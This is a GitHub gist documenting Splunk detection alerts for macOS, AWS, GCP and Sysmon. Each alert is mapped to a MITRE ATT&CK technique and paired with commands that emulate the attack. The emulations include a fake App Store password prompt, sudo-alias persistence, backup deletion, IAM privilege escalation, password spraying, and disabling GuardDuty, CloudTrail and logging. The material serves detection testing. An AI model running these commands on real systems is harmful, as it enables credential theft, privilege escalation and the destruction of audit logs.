
##
#
https://gist.github.com/manasmbellani/172e44466755f73e3a01a978e30b121a
#
##

splunkawssecuritymon - Alerts built in AWS Security Monitoring App for Splunk
!splunkappsdoco.md
README
This gist contains information about various splunk apps pertaining to detection engineering that have been released on Splunkbase.

Usage
Review the files on gist.github.com OR consider cloning this and opening it in a Markdown editor such as Typora to obtain a navigational outline

macosxsecurity.md
Introduction
This document describes the different ways of simulating alerts and the alerts generated via the Mitre Attack Matrix techniques, and mechanisms to test these alerts.

Currently, a splunk app has not been built for this, however, it is possible to view the logs through an app like Crescendo

Alerts
TA002 Execution
T1059 Command and Scripting Interpreter
T1059.002 AppleScript
macosx_detect_social_engineer_dialog_box_osascript
Get an application such as App Store to trigger a dialog box to capture credentials

Emulating via bash CLI

osascript -e 'tell app "App Store" to activate' -e 'tell app "App Store" to activate' -e 'tell app "App Store" to display dialog "Update required, please enter your password." & return & return default answer "" with icon 1 with hidden answer with title "App Store Alert"'
Detecting via crescendo

Process=/usr/bin/osascript
argv="*tell app*display dialog*"
Example Log:

Event Type: process::exec
Process: /usr/bin/osascript
Pid: 37822 (Parent) -> 11582
User: manasbellani
Timestamp: 1686388391543
Platform Binary: true
Signing ID: com.apple.osascript
Props:
{
    action = "ES_AUTH_RESULT_ALLOW";
    argc = 7;
    argv = "osascript -e tell app \"App Store\" to activate -e tell app \"App Store\" to activate -e tell app \"App Store\" to display dialog \"Update required, please enter your password.\" & return & return default answer \"\" with icon 1 with hidden answer with title \"App Store Alert\" ";
    isplatformbin = true;
    ppid = 11582;
    signingid = "com.apple.osascript";
    size = 208528;
    teamid = "";
}
References

https://www.n00py.io/2016/10/privilege-escalation-on-os-x-without-exploits/

TA003 Persistence
T1546 Event Triggered Execution
T1546.004 Unix Shell Configuration Modification
macosx_detect_sudo_bash_profile_persistence_alias
Emulating via bash cli

# Create a temp file with command to execute
echo 'echo testing1234 > /tmp/testing1234.txt' > /tmp/test.sh; chmod +x /tmp/test.sh

# Add the following configuration to ~/.bash_profile, ~/.zshrc, and others
alias sudo='sudo sh -c '\''/tmp/test.sh & exec "$@"'\'' sh'
sudo whoami
https://github.com/n00py/pOSt-eX/blob/master/empire_modules/piggyback.py

Detection via crescendo

Process="/usr/bin/sudo"
User="root"
argv="sudo*-c*exec*"
Example log:

Event Type: process::exec
Process: /usr/bin/sudo
Pid: 37693 (Parent) -> 11582
User: root
Timestamp: 1686386655464
Platform Binary: true
Signing ID: com.apple.sudo
Props:
{
    action = "ES_AUTH_RESULT_ALLOW";
    argc = 6;
    argv = "sudo sh -c /tmp/test.sh & exec \"$@\" sh whoami ";
    isplatformbin = true;
    ppid = 11582;
    signingid = "com.apple.sudo";
    size = 1246464;
    teamid = "";
}
References

https://www.n00py.io/2016/10/privilege-escalation-on-os-x-without-exploits/

TA0006 Credential Access
T1056 Input Capture
T1056.002 GUI Input Capture
macosx_detect_social_engineer_dialog_box_osascript
See macosx_detect_social_engineer_dialog_box_osascript in TA0002 Execution

TA0040 Impact
T1485 Data Destruction
macosx_detect_delete_backups_tmutil
Deletion of backups via the tmutil utility

Detection via crescendo

Process="/usr/bin/tmutil"
Props.argv="*delete*-d*-t*"
Example log record recorded via Crescendo:

Event Type: process::exec
Process: /usr/bin/tmutil
Pid: 37552 (Parent) -> 37551
User: root
Timestamp: 1686373370805
Platform Binary: true
Signing ID: com.apple.timemachine.tmutil
Props:
{
    action = "ES_AUTH_RESULT_ALLOW";
    argc = 6;
    argv = "tmutil delete -d test123 -t 2020-11-18-100936 ";
    isplatformbin = true;
    ppid = 37551;
    signingid = "com.apple.timemachine.tmutil";
    size = 1258288;
    teamid = "";
}
Emulate via tmutil

# List the backups
sudo tmutil listbackups

# Delete the backup via tmutil (made up timestamp)
backup="test123"; timestamp="2020-11-18-100936"; sudo tmutil delete -d "$backup" -t "$timestamp"
References:

https://apple.stackexchange.com/a/281617

splunkawssecuritymon.md
Introduction
This document describes the alerts built in splunkawssecuritymon splunk app as referenced by Mitre Attack Matrix techniques, and mechanisms to test these alerts.

The splunk app is available here: https://classic.splunkbase.splunk.com/app/6780

Alerts
TA0002 Execution
T1648 Serverless Execution
aws_detect_lambda_function_creation_serverless_execution
Alert to detect if new Lambda Functions have been created which can be used to perform actions

Emulate via awscli

Add code as code.zip to an S3 bucket to assign an account Administrator access:

import boto3

def lambda_handler(event, context):
    client = boto3.client(‘iam’)
    response = client.attach_user_policy(
        UserName='$USERNAME',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return response
Create AWS Lambda Function called test_iampassrole via AWS CLI where code has been added to the S3 bucket above e.g. test-iampassrole with a role

aws lambda create-function --function-name test_iampassrole --runtime python3.9 --role arn:aws:iam::$ACCOUNT_ID:role/test-iampassrole-admin --handler code.lambda_handler --code=S3Bucket=test-iampassrole,S3Key=code.zip --region=ap-southeast-2 --profile=test_iampassrole
Invoke the Lambda Function called test_iampassrole with output written to /tmp/output.txt:

aws lambda invoke --function-name test_iampassrole /tmp/output.txt
aws_detect_lambda_function_deletion_serverless_execution
Alert to detect if a Lambda Function has been deleted which may have been used in the past to perform actions

Emulate via awscli

To delete a function named test_iampassrole11

aws lambda delete-function --function-name test_iampassrole11
T1204 User Execution
aws_detect_ec2_instances_run
Alert to detect creation of new EC2 instances

Note: This rule should be baselined to exclude usernames that usually create EC2 instances

Emulate via AWSCLI

aws ec2 run-instances --image-id ami-0e2e4c9e55712f9e3 --instance-type t2.micro --iam-instance-profile Arn=arn:aws:iam::$AWS_ACCOUNT_ID:instance-profile/test-instance-profile --key-name "test-instance" --security-group-ids "sg-0f1c7fa18048f7bc9" --profile testuser --subnet-id subnet-0a70e41ea53aab6ab --region ap-southeast-2
T1204.003 Malicious Image
aws_detect_ecr_image_auth_token_get
Alert to detect request of an authorization token to an ECR repository to configure tools such as Docker to push an image

Reference: https://attack.mitre.org/techniques/T1204/003/ > Image Creation

Note: This alert may need to be baselined to your environment to ignore activity from known accounts that pull authorization tokens for image configuration.

Emulate via awscli

aws ecr create-repository --repository-name $REPOSITORY_NAME --region ap-southeast-2

# Replace AWS_ACCOUNT_ID with your AWS Account ID
aws ecr get-login-password --region ap-southeast-2 | docker login --username AWS --password-stdin $AWS_ACCOUNT_ID.dkr.ecr.ap-southeast-2.amazonaws.com

# If additional steps needed to understand how this would work further, execute commands below:

## Build an image
docker build -t $REPOSITORY_NAME .

## Tage the image
docker tag testrepo:latest 169917409101.dkr.ecr.ap-southeast-2.amazonaws.com/testrepo:latest

## Push the image for execution
docker push 169917409101.dkr.ecr.ap-southeast-2.amazonaws.com/testrepo:latest
aws_detect_ecr_new_repo_image_create
Alert to detect creation of a new repository in AWS ECR and image push

Reference: https://attack.mitre.org/techniques/T1204/003/ > Image Creation

Note: This alert may need to be baselined to your environment to ignore activity from known accounts that create repositories.

Emulate via AWSCLI

aws ecr create-repository --repository-name $REPOSITORY_NAME --region ap-southeast-2
TA0003 Persistence
T1098 Account Manipulation
aws_detect_iam_group_added_with_user
Alert to detect addition of AWS user with AWS Group

Note: This rule should be baselined to exclude usernames that usually add accounts to groups (e.g. CI/CD service accounts). Examples of how to achieve this to add an account $CI_CD_SERVICE_ACCOUNT:

...
| where (eventSource = "iam.amazonaws.com" AND eventName = "AddUserToGroup")
```Exclude normal accounts here```
| where !(requestParametersUserName = "$CI_CD_SERVICE_ACCOUNT")
...
Emulate via AWSCLI

aws iam list-users
aws iam list-groups
aws iam add-user-to-group --group-name $GROUP_TO_ADD_TO --user-name $USER_TO_ADD
aws_detect_iam_group_added_with_user_from_ec2
Alert to detect addition of a user to a group from an EC2 instance

Emulate via AWSCLI

Note: This rule should be baselined to exclude usernames that usually add accounts to groups (e.g. CI/CD service accounts). Examples of how to achieve this to add an account $CI_CD_SERVICE_ACCOUNT:

# Create an EC2 instance and assign it a privileged role e.g. AdministratorAccess

# Install AWSCLI 
sudo apt-get -y install awscli
sudo apt-get -y update && sudo apt-get -y install awscli

# Add a user to the specified group `security_audit_team`
date; aws iam add-user-to-group --group-name security_audit_team --user-name testuser2
T1098.001 Additional Cloud Credentials
aws_detect_iam_user_created
Alert to detect creation of a new IAM user for persistence

Emulate via awscli

aws iam create-user --user-name $USERNAME
aws_detect_iam_user_deleted
Alert to detect clean-up of an IAM user for persistence

Emulate via awscli

aws iam list-users
aws iam delete-user --user-name $USERNAME
aws_detect_iam_accesskey_created
Alert to detect creation of a new access key for an IAM user for persistence

Emulate via awscli

aws iam create-access-key --user-name $USERNAME
aws_detect_iam_accesskey_deleted
Alert to detect deletion of a new access key for an IAM user for persistence

Emulate via awscli

To list existing access key IDs which can be deleted
aws iam list-access-keys --user-name $USERNAME
aws iam delete-access-key --user-name $USERNAME --access-key-id $ACCESS_KEY_ID
aws_detect_iam_login_profile_create
Alert to detect creation of a console login for a user

Note: This rule should be baselined to exclude usernames that usually create login profile for users e.g. AWS System Admin

Emulate via AWSCLI

aws iam create-login-profile --user-name testuser3 --password Password123! --no-password-reset-required
aws_detect_iam_login_profile_update
Alert to detect update of the existing console login for a user

Note: This rule should be baselined to exclude usernames that usually updates login profile for users e.g. AWS System Admin

Emulate via AWSCLI


aws iam create-login-profile --user-name testuser3 --password Password123! --no-password-reset-required
aws iam update-login-profile --user-name testuser3 --password Password234 --no-password-reset-required
T1098.004 SSH Authorized Keys
aws_detect_ec2_ssh_public_key_addition
Alert to detect attempt to add SSH Public Key for logging to the EC2 instance

Emulate via UI / EC2 Connect

Launch an EC2 instance via the UI > Select Connect > Select EC2 Instance Connect > Select Connect

TA0004 Privilege Escalation
aws_detect_iam_default_policy_version_set
Alert to detect if a default policy version has been assigned

Note: This rule should be baselined to exclude usernames that usually set the default policy version setting.

Reference: https://bishopfox.com/blog/privilege-escalation-in-aws, See 02 - iam:SetDefaultPolicyVersion2

Emulate via AWSCLI

# /tmp/admin_policy.json
{
   "Version": "2012-10-17",
   "Statement": [
       {
           "Sid": "AllowEverything",
           "Effect": "Allow",
           "Action": "*",
           "Resource": "*"
       }
   ]
}

# /tmp/restricted.json
{
   "Version": "2012-10-17",
   "Statement": [
       {
           "Sid": "AllowEverything",
           "Effect": "Allow",
           "Action": "iam:SetDefaultPolicyVersion",
           "Resource": "arn:aws:iam::*:policy/test"
       }
   ]
}

# Get the AWS Policy ARN for the new policy that allows all access
aws iam create-policy --policy-name 'alloweverythingpolicy' --policy-document file:///tmp/admin_policy.json

# Create a new policy version which is very restrictive
aws iam create-policy-version --policy-arn $POLICY_ARN --policy-document file:///tmp/admin_policy2.json --set-as-default

# Create a new group
aws iam create-group --group-name testgroup

# Create a new user
aws iam create-user --user-name testuser

# Add the new user to the group
aws iam add-user-to-group --group-name testgroup --user-name testuser
 
# Attach the AWS policy 
aws iam attach-group-policy --group-name testgroup --policy-arn arn:aws:iam::$ACCOUNT_ID:policy/alloweverythingpolicy

# Try to list the S3 buckets as the new user (assumes credentials added to ~/.aws/credentials file) - access should be denied 
aws s3 ls --profile testuser

# Now change and wait for a couple of minutes - access will be allowed
aws iam set-default-policy-version --policy-arn arn:aws:iam::$AWS_ACCOUNT_ID:policy/alloweverythingpolicy --version-id v1

aws_detect_iam_new_policy_version_assignment
Alert to detect if iam:CreatePolicyVersion permission was used to overwrite a new policy version for an existing policy

Note: This rule should be baselined to exclude usernames that usually add accounts to groups (e.g. CI/CD service accounts). Examples of how to achieve this to add an account $CI_CD_SERVICE_ACCOUNT:

...
| where (eventSource = "iam.amazonaws.com" AND eventName = "CreatePolicyVersion")
```Exclude normal accounts here```
| where !(requestParametersUserName = "$CI_CD_SERVICE_ACCOUNT")
...
Emulate via AWSCLI

# admin_policy.json
{
   "Version": "2012-10-17",
   "Statement": [
       {
           "Sid": "AllowEverything",
           "Effect": "Allow",
           "Action": "*",
           "Resource": "*"
       }
   ]
}

# Identify the policies
aws iam list-policies
aws iam list-policy-versions --policy-arn $POLICY_ARN

# Create new defaultpolicy version
aws iam create-policy-version --policy-arn $POLICY_ARN --policy-document file:///tmp/admin_policy.json --set-as-default

# Users / Entities that the group the policy is attached to is part of should have full access
aws iam list-entities-for-policy --policy-arn  $POLICY_ARN
aws iam list-groups-for-user --user-name  $USER_NAME
Reference: See 01 - iam:CreatePolicyVersion in https://bishopfox.com/blog/privilege-escalation-in-aws

TA0005 Defense Evasion
T1562 Impair Defenses
T1562.001 Disable or Modify Tools
aws_detect_guardduty_disable
Alert to detect if AWS GuardDuty has been disabled within the account

Emulate via UI

Visit Guardduty in AWS Console > Settings > Disable Guardduty. This assumes that Guardduty is previously enabled.

Emulate via AWSCLI

# List all detectors enabled
aws guardduty list-detectors

# Delete the detectors found
aws guardduty delete-detector --detector-id $DETECTOR_ID
aws_detect_guardduty_archive_findings
Alert to detect if AWS GuardDuty finding has been disabled within the account which hides it from default view

Emulate via UI

Visit Guardduty in AWS Console > Select Finding > Actions > Archive.

Emulate via AWSCLI

# Obtain the detector ID and finding IDs via the list-detectors and list-findings awscli commands respectively
aws guardduty archive-findings --detector-id 5....5e --finding-ids 6....a e....3
aws_detect_guardduty_suppression_filter_creation
Alert to detect if Suppression filter has been created in AWS GuardDuty which can be used to suppress important findings

Emulate via AWSCLI

# /tmp/filter.txt
{
    "Criterion": {
        "service.archived": {
            "Eq": [
                "false"
            ]
        },
        "service.action.dnsRequestAction.domain": {
            "Eq": [
                "test.example.com"
            ]
        }
    }
}

aws guardduty create-filter --action ARCHIVE --detector-id  56c3529a57c1457a517b4cafa788fe5e --name filter1 --finding-criteria file:///tmp/filter.txt
T1562.008 Disable Cloud Logs
aws_detect_cloudtrail_trail_deleted
Alert to detect if a CloudTrail Trail deleted which can disable the logging altogether for the AWS account

Emulate via AWSCLI

aws cloudtrail delete-trail --name test-trail2
aws_detect_s3_cloudtrail_bucket_lifecycle_rule_applied
Alert to detect if a bucket lifecycle rule may have been applied to truncate the logs in the S3 bucket (e.g. for cloudtrail)

Note: This rule's search requires explicit modification to include the names of the buckets used for storing cloudtrail and other important logs

Emulate via AWSCLI

# Assuming the bucket `logs-bucket-t41514l` already exists
aws s3api put-bucket-lifecycle-configuration --bucket logs-bucket-t41514l --lifecycle-configuration '{"Rules": [{"Expiration": {"Days": 1},"Status": "Enabled","Prefix": ""}]}'
aws_detect_ec2_vpc_flow_config_deleted
Alert to detect if VPC Flow Configuration has been deleted which can interrupt flow logs

Emulate via AWSCLI

# List the flow logs
aws ec2 describe-flow-logs

# Delete a specific flow logs
aws ec2 delete-flow-logs --flow-log-ids fl-0eb4435eddfe98630
aws_detect_cloudwatch_log_group_delete
Alert to detect if a Cloud Loggroup has been deleted

Emulate via AWSCLI

aws logs delete-log-group --log-group-name testloggroup
aws_detect_cloudwatch_log_stream_delete
Alert to detect the deletion of log-stream within a given log-group in CloudWatch

Emulate via AWSCLI

# First list all log groups
aws logs describe-log-groups

# Then list all log streams
aws logs describe-log-streams --log-group-name "$LOG_GROUP_NAME"

# Ensure that any $ get escaped with \$
aws logs delete-log-stream --log-group-name "$LOG_GROUP_NAME" --log-stream-name "$LOG_STREAM_NAME"
T1556 Modify Authentication Process
aws_detect_iam_password_policy_update
Alert to detect a change in AWS IAM Password Policy

Emulate via awscli

aws iam update-account-password-policy --require-numbers
TA0006 Credential Access
T1110 Brute Force
T1110.004 Credential Stuffing
aws_detect_signin_credential_stuffing
Alert to detect credential stuffing attack affecting the AWS Console Sign-in page

Reference: https://github.com/redcanaryco/atomic-red-team/blob/f296668303c29d3f4c07e42bdd2b28d8dd6625f9/atomics/T1201/T1201.md#atomic-test-11---examine-aws-password-policy

Emulate via CLI

# Get the Account ID from the AWS Console Sign-In page
/root/go/bin/GoAWSConsoleSpray -a $AWS_ACCOUNT_ID -u /tmp/users.txt -p /tmp/pass.txt
TA0007 Discovery
T1201 Password Policy Discovery
aws iam get-account-password-policy
Alert to detect attempts to enumerate AWS IAM Password Policy

Reference: https://github.com/redcanaryco/atomic-red-team/blob/f296668303c29d3f4c07e42bdd2b28d8dd6625f9/atomics/T1201/T1201.md#atomic-test-11---examine-aws-password-policy

Emulate via awscli

aws iam get-account-password-policy 
T1580 Cloud Infrastructure Discovery
aws_detect_cloud_infrastructure_discovery_via_golang_smogcloud
This alert checks if there is an attempt to perform AWS Cloud Infrastructure Discovery via Golang tools such as Bishop Fox's smogcloud

Emulate

Install and run smogcloud as follows using keys available for an AWS environment:

go install github.com/BishopFox/smogcloud@latest
export AWS_ACCOUNT_ID="smogcloud_test"
export AWS_ACCESS_KEY_ID="<replace-access-key-id-here>"
export AWS_SECRET_ACCESS_KEY="<replace-secret-access-key-here>"
smogcloud
Other Usecases
This section describes use-cases which can be detected by one or more of the alerts above.

03 - iam:PassRole and ec2:RunInstances
By using a role with permissions iam:PassRole and ec2:RunInstances on any resource assigned to a user, a user can start a new instance with an arbitrary role and assign a new permissions to a user from inside the running EC2 instance.

Reference: https://bishopfox.com/blog/privilege-escalation-in-aws

Detection

aws_detect_ec2_instances_run: Creation of new EC2 instances (which can also be extended to use a role)
aws_detect_iam_group_added_with_user_from_ec2: Addition of a user to the group from an EC2 instance using an EC2 role
Emulate via awscli

# Create test users where `testuser` will start the EC2 instance with a role that can be used to add the user to `testuser2` to `security_audit_team` group from the EC2 instance
aws iam create-user --user-name testuser
aws iam create-access-key --user-name testuser
aws iam create-user --user-name testuser2

# Create a policy which allows iam:passRole and EC2:RunInstances and assign it to the user
aws iam create-policy --policy-name 'testpassrolecreateinstance' --policy-document file:///tmp/testpassrolecreateinstance.json   
aws iam create-group --group-name testgroup
aws iam add-user-to-group --group-name testgroup --user-name testuser
aws iam attach-group-policy --group-name testgroup --policy-arn arn:aws:iam::$AWS_ACCOUNT_ID:policy/testpassrolecreateinstance 

# Create a new role to be passed to EC2 instance which gives AdministratorAccess
aws iam create-role --role-name test-ec2-admin-role --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},"
Action":"sts:AssumeRole"}]}'  
aws iam attach-role-policy --role-name test-ec2-admin-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess


# Create a new EC2 security group which will be used by the user to login
aws ec2 describe-vpcs
aws ec2 describe-subnets
aws ec2 describe-security-groups
aws ec2 create-security-group --group-name test-ssh-ingress --description "Security group for SSH ingress and open egress" --vpc-id vpc-032d10b8504c5c9c7
aws ec2 authorize-security-group-ingress --group-id sg-0f1c7fa18048f7bc9 --protocol tcp --port 22 --cidr 0.0.0.0/0
aws ec2 authorize-security-group-egress --group-id sg-0f1c7fa18048f7bc9 --protocol all --cidr 0.0.0.0/0\n

# Create an instance profile which can be assigned to the EC2 instance 
aws iam create-instance-profile --instance-profile-name test-instance-profile
aws iam add-role-to-instance-profile --instance-profile-name test-instance-profile --role-name test-ec2-admin-role

# Start the EC2 instance with the role passed in by the `testuser` with the Instance Profile,
aws ec2 run-instances --image-id ami-0e2e4c9e55712f9e3 --instance-type t2.micro --iam-instance-profile Arn=arn:aws:iam::$AWS_ACCOUNT_ID:instance-profile/test-instance-profile --key-name "test-instance" --security-group-ids "sg-0f1c7fa18048f7bc9" --profile testuser --subnet-id subnet-0a70e41ea53aab6ab --region ap-southeast-2

# `testuser` then will SSH to the EC2 instance and execute the following commands
sudo apt-get -y install awscli
sudo apt-get -y update && sudo apt-get -y install awscli
aws iam add-user-to-group --group-name security_audit_team --user-name testuser2

splunkgcpsecuritymon.md
Introduction
This document describes the alerts built in splunkgcpsecuritymon splunk app as referenced by Mitre Attack Matrix techniques, and mechanisms to test these alerts.

The splunk app is available here: https://classic.splunkbase.splunk.com/app/6193

Alerts
TA0001 Initial Access
Exploit Public-Facing Application
gcp_detect_bigquery_dataset_made_public
Alert to detect creation of a Public BigQuery dataset in the GCP Account

Reference: https://www.trendmicro.com/cloudoneconformity/knowledge-base/gcp/BigQuery/publicly-accessible-big-query-datasets.html

Emulate via GCP Console UI

#Visit GCP Console > BigQuery > SQL Workspace > Create Dataset
 
# Once Dataset is created, click on the ... drop-down > select Share > Select 'AllUsers' or 'AllAuthenticatedUsers' > Assign 
'BigQuery Viewer' > Consent to creation of Public Dataset
gcp_detect_kms_key_permissions
Alert for detecting creation of Public KMS Keyrings or keys with excessive permissions assignment to users

Reference: https://www.trendmicro.com/cloudoneconformity/knowledge-base/gcp/CloudKMS/publicly-accessible-kms-cryptokeys.html

Emulate via gcloud

# First create a test keyring
gcloud kms keyrings create testkeyring --location=australia-southeast1

# Create a test key
gcloud kms keys create testkey --keyring=testkeyring --location=australia-southeast1 --purpose="encryption"

# List the keyring to ensure it is available
gcloud kms keyrings list --location=australia-southeast1

# Assign allUsers editor permission to the keyring
gcloud kms keyrings add-iam-policy-binding testkeyring  --location=australia-southeast1 --member=allUsers --role=roles/editor

# Assign allUsers editor permission to the key
gcloud kms keys add-iam-policy-binding testkey --keyring=testkeyring --location=australia-southeast1 --member=allUsers --role=roles/editor

# Remove allUsers permissions on key and keyring
gcloud kms keys remove-iam-policy-binding testkey --location=australia-southeast1 --member=allUsers --role=roles/editor --keyring=testkeyring
gcloud kms keyrings remove-iam-policy-binding testkeyring --location=australia-southeast1 --member=allUsers --role=roles/editor
TA0002 Execution
User Execution
gcp_detect_kubernetes_pod_exec_attempt
Alert to detect attempts to exec into already running Kubernetes pod

Emulate via gcloud

Deploy a test kubernetes cluster in the GCP project (a single node g1-small cluster should be sufficient)

Once the cluster is up, connect to the test pod via gcloud (ensuring that we have already authenticated gcloud to our GCP account):
    gcloud auth login
    gcloud container clusters get-credentials $CLUSTER_NAME --zone australia-southeast1-a --project $PROJECT_ID

Create a test pod 'testpod':
    kubectl run testpod --rm -i --tty --image ubuntu -- bash

Exec into the test pod 'testpod':
    kubectl exec testpod -i --tty -- bash
gcp_detect_kubernetes_pod_create_attempt
Alerrt to detect attempts to spawn / create new Kubernetes pod

Emulate via gcloud

Similar to steps described in section gcp_detect_kubernetes_pod_exec_attempt

TA0003 Persistence
Account Manipulation
Additional Cloud Credentials
gcp_detect_excessive_service_account_permissions
Reference: https://www.trendmicro.com/cloudoneconformity/knowledge-base/gcp/CloudIAM/restrict-admin-access-for-service-accounts.html

Emulate via gcloud


# Create a service account e.g. $SERVICE_ACCOUNT_NAME in a project with ID $PROJECT_ID
gcloud iam service-accounts create $SERVICE_ACCOUNT_NAME --display-name "$SERVICE_ACCOUNT_NAME"

# List the service accounts and get the email of the created service account
gcloud iam service-accounts list --format='value(EMAIL)' --filter="displayName:$SERVICE_ACCOUNT_NAME"

# Assign excessive permissions (e.g. project owner role) to the service
gcloud projects add-iam-policy-binding $PROJECT_ID --member="serviceAccount:$SERVICE_ACCOUNT" --role="roles/iam.serviceAccountUser" --role="roles/owner"
gcp_detect_iam_service_account_key_user_managed
Alert for Creation of User Managed Service Account keys for user-managed service accounts

Reference: https://www.trendmicro.com/cloudoneconformity/knowledge-base/gcp/CloudIAM/delete-user-managed-service-account-keys.html

Emulate via gcloud

# Create a test service account
gcloud iam service-accounts create test-service-account2

# Create a private key of p12 format and replace $PROJECT_ID
gcloud iam service-accounts keys create /tmp/key.json --iam-account=test-service-account2@$PROJECT_ID.iam.gserviceaccount.com --key-file-type=p12
gcp_detect_api_key_creation
Alert for creation of GCP API Keys

Reference: https://www.trendmicro.com/cloudoneconformity/knowledge-base/gcp/CloudIAM/delete-api-keys.html

Emulate via gcloud

gcloud alpha services api-keys create --display-name 'testapikey' 
gcp_detect_api_key_updates
Alert for update of GCP API Keys

Emulate via gcloud

# List existing api keys and identify the key ID via the key_id field
gcloud alpha services api-keys list

# Get the Key ID via the api-keys list above
gcloud alpha services api-keys update \
    $key_id \
    --allowed-referrers="https://www.example.com/*,http://sub.example.com/*"
SSH Authorized Keys
gcp_detect_ssh_keys_added_to_compute_metadata
Alert to detect creation of SSH keys to SSH into compute instance

Reference: https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/

Emulate via gcloud

# Create a test compute instance 'test-instance-1' via the console - can be an f1-micro instance

# Build an SSH key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# Add the SSH key to the 'test-instance-1' to 
gcloud compute instances add-metadata "test-instance-1" --metadata-from-file ssh-keys=meta.txt --zone "australia-southeast1-b" --project "test-project-2-355701"
TA0004 Privilege Escalation
Domain Policy Modification
Domain Trust Modification
gcp_detect_org_policy_changes
Alert to detect any modifications to the GCP Organizational Policy

Emulate via Google Console UI

Pre-requisite is an GCP organization setup which consists of atleast one project

Select Organization from resource selector > IAM & Admin > Organizational Policies > Visit a policy e.g. 'Allowed Ingress Settings (Cloud Functions)' > Select 'Google Managed Default' > Save
Valid Accounts
Cloud Accounts
gcp_detect_service_account_impersonation_perms
Alert for creation of an account or assignment of a privilege providing Service Account User, Service Account Token Creator roles

Reference: https://www.trendmicro.com/cloudoneconformity/knowledge-base/gcp/CloudIAM/check-for-iam-users-with-service-roles.html

Emulate via Google Console UI

Visit IAM > Create a new account > Assign 'Service Account User' and 'Service Account Token Creator' roles
TA0005 Defense Evasion
Modify Cloud Compute Infrastructure
gcp_detect_allusers_gcs_actions
Alert to detect granting of public permissions to a Google Cloud Storage bucket

Emulate via gcloud

gcloud projects add-iam-policy-binding [PROJECT_ID] \
    --member=allUsers \
    --role=roles/storage.objectViewer \
    --bucket=[BUCKET_NAME]
Impair Defenses
Disable Cloud Logs
gcp_detect_clouddns_logging_disabled
Alert to detect disable of Cloud DNS Audit logging

Emulate via gcloud

gcloud dns managed-zones list 

gcloud dns managed-zones update $DNS_ZONE --no-log-dns-queries
gcp_detect_load_balancer_logging_disabled
Alert to disable Load Balancer Logging to prevent detection of untracked configuration changes

Emulate via UI

# Create a new instance group and a new instance template using 1 min and 1 max instances (f1-micro)

# Create a HTTP load balancer > From Internet to my VMs or serverless services > Create a backend service and point to instance-template-1 
    > Under Logging, leave 'Enable Logging' unchecked

# Continue with all the steps to create the backend service

# Alternatively, for existing load balancer using backend service, edit Load balancer > Backend Configuration > Edit Backend > Uncheck Enable Logging > Update
gcp_detect_audit_config_change
Alert to detect removal of audit config logging settings

Emulate via GCP Console UI

# Visit the GCP Console UI > Audit Logs > Visit Log Types > Uncheck an option (e.g. `Data Read`)
gcp_detect_logsink_disable
Alert to disabling of log sinks that forward data to other sources

Emulate via GCP Console UI

# Open GCP Console > Logging Explorer > Logs Router > Select a Logging Sink > Click on 'Disable' on the '...' drop-down
Disable or Modify Cloud Firewall
gcp_detect_vpc_service_control_service_perimeter_changes
Alert to detect disable or modification of VPC Service Controls on the Service Perimeter

Pre-requisite is an GCP organization setup which consists of atleast one project

Emulate via GCP Console UI

# Create a service perimeter 

# Select Organization from resource selector > Security > VPC Service Controls > Visit Dry Run > New Perimeter > Create a Perimeter Title > Select 'Regular Perimeter' > Add a test project > Select 'Create Perimeter'
gcp_detect_vpc_service_control_access_policy_changes
Alert to detect disabling or modification of VPC Service Controls - Access Policy

Emulate via GCP Console UI

Pre-requisite is an GCP organization setup which consists of atleast one project

# Create a service perimeter
Select Organization from resource selector > Security > VPC Service Controls > Visit Manage Policies > Create > Provide an access policy name  > add a test project > 'Create Access Policy'
Disable or Modify Tools
gcp_detect_clouddns_dnssec_disabled
Alert to detect disabling of DNSSEC for Cloud DNS logging

Emulate via gcloud

# create a cloud dns managed zone with dnssec state switched off
gcloud dns managed-zones create $DNS_ZONE --description="Test DNS Zone" --dns-name="testdnszone.com" --dnssec-state=off

# update the cloud dns managed zone from off to on OR vice-versa
gcloud dns managed-zones update $DNS_ZONE --dnssec-state=on
gcloud dns managed-zones update $DNS_ZONE --dnssec-state=off

# delete the cloud dns managed zone
gcloud dns managed-zones delete $DNS_ZONE
Emulate via GCP Console UI

# Visit Cloud DNS > Create Zone > Ensure that "Cloud Logging" is not enabled > Create
TA0006 Credential Access
TA0007 Discovery
Cloud Service Discovery
gcp_detect_excessive_services_enabled
Alert to detect excessive number of services enabled which indicates potential enumeration

Emulate via GCP Console UI

Use gcloud CLI:
    gcloud services enable $SERVICE_NAME
TA0010 Exfiltration
gcp_detect_api_activity_unusually_high_last7days
Alert to detect unusually High API usage by any user identity

Reference: https://github.com/GoogleCloudPlatform/security-analytics/blob/main/src/4.01/4.01.md

Emulate via GCP Console UI

Perform large number of actions with the user account in GCP console e.g. create service account, disable service account, enable service account etc. compared to last 4 days
Transfer Data to Cloud Account
gcp_detect_vpc_service_controls_violation
Alert on GCP Actions violating VPC Service Controls

Reference: https://github.com/GoogleCloudPlatform/security-analytics/blob/main/src/1.10/1.10.md

Emulate via GCP Console UI

# Create a new test GCS bucket in a test project

# Create a new service perimeter and include the test project in the service perimeter and the GCS Cloud Storage API in the perimeter

# Now attempt to list the files in the GCS bucket
gsutil ls
splunksysmonsecurity.md
Introduction
This document describes the alerts built in splunksysmonsecurity splunk app as referenced by Mitre Attack Matrix techniques, and mechanisms to test these alerts.

The splunk app is available here: https://splunkbase.splunk.com/app/6253

Alerts
TA0001 Initial Access
Phishing
Spearphishing Attachment
sysmon_detect_encrypted_zip_phishing_files
Opening of Encrypted zip files with Winows Zip OR 7zip followed by opening of Common Phishing documents.

Alert pre-requisite

Windows Event ID 5379 (Credential Manager credentials were read) which are typically generated in Windows 10/2016 onwards

Emulate via UI

Open an encrypted (using ZipCrypto) zip file in Windows by double-clicking. Encrypted zip file can be generated via 7z with ZipCrypto encryption algorithm

References: https://twitter.com/SBousseaden/status/152338319751337984

TA0002 Execution
User Execution
Malicious File
sysmon_detect_applocker_file_block
Alert to detect that AppLocker had blocked an execution of application

Alert pre-requisite: Windows App Locker Logs - Event ID 8004

Emulate via UI

First, follow steps for alert 'Modifying the Applocker policy used for application whitelisting' to enable applocker policy

